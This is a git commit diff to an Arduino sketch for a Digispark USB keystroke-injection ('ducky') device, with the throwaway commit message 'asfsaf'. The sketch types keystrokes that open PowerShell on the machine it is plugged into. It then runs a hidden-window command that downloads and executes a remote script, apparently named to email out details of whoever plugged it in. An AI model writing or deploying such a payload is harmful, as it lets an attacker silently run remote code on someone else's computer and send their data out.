e6239a28721fcb67a244401acf25381f26fff2c5
NoobleMcScrunchkin <kieranaslett@gmail.com>
2019-02-05 11:54:44 +0000

    asfsaf

--- DuckyEmail/DuckyEmail.ino
+++ DuckyEmail/DuckyEmail.ino
@@ -5,8 +5,12 @@ void setup() {
 void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
- DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+ DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
+ DigiKeyboard.print("powershell");
+ DigiKeyboard.delay(500);
+ DigiKeyboard.sendKeyStroke(KEY_ENTER);
+ DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell.exe -WindowStyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/WhoPluggedInEmail.ps1');");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
